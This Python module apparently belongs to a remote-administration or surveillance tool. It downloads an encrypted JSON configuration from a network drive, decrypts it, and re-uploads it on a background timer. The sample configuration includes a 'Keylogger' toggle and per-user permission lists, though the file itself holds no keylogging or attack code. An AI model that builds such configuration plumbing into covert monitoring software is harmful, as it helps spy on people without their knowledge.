import config
import os
import json
import encryption_keys
from modules import Crypt
from modules import NetworkDrive
from modules import Environment
from threading import Timer

configuration = {}


def get():
    global configuration

    if not configuration:
        configuration = download_and_get()

    return configuration


def update(new_configuration):
    global configuration

    configuration = new_configuration


def delete_temp_configuration():
    os.remove(config.tmp_configuration_path)


def upload(configuration: dict):
    Environment.create()

    configuration = json.dumps(configuration)
    configuration = Crypt.encrypt(
        configuration, encryption_keys.configuration_ek)

    with open(config.tmp_configuration_path, 'w') as file:
        file.write(configuration)

    while True:
        try:
            NetworkDrive.upload(config.tmp_configuration_path,
                                config.configuration_path)
        except Exception as ex:
            print('[Error updating configuration]')
            print(ex)
        else:
            break

    delete_temp_configuration()


def download_and_get():
    """
    Return configuration 
    {
  "General": {
    "Keylogger": 0
  },
  "Users": {
    "ID": {
      "language": "eng",
      "permissions": {
        "allowed": [],
        "forbidden": []
      }
    }
  }
}
    """
    Environment.create()

    NetworkDrive.download(config.configuration_path,
                          config.tmp_configuration_path, check_temp=True)

    with open(config.tmp_configuration_path) as file:
        configuration = file.read()

    try:
        configuration = Crypt.decrypt(
            configuration, encryption_keys.configuration_ek)

        configuration = json.loads(configuration)
    except Exception as ex:
        print('[ERROR DOWNLOADING AND GETTING CONFIGURATION]')
        print(ex)
        print(configuration)

    return configuration


def auto_update():
    upload(configuration)

    print('[UPDATING CONFIGURATION]')

    update_timer = Timer(
        interval=config.configuration_timeout, function=auto_update)
    update_timer.daemon = True
    update_timer.start()


configuration = get()
